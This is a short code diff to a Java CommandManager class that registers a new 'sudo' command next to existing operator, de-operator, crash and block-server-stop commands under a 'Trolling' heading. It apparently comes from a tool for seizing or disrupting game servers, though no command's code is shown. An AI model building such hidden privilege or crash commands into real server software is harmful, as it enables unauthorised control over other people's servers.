@@ -45,6 +45,7 @@ public class CommandManager {
 		// Server
 		this.getCommandList().add(new CommandOP());
 		this.getCommandList().add(new CommandDEOP());
+		this.getCommandList().add(new CommandSUDO());
 		this.getCommandList().add(new CommandCrash());
 		this.getCommandList().add(new CommandBlockServerStop());
 		// Trolling
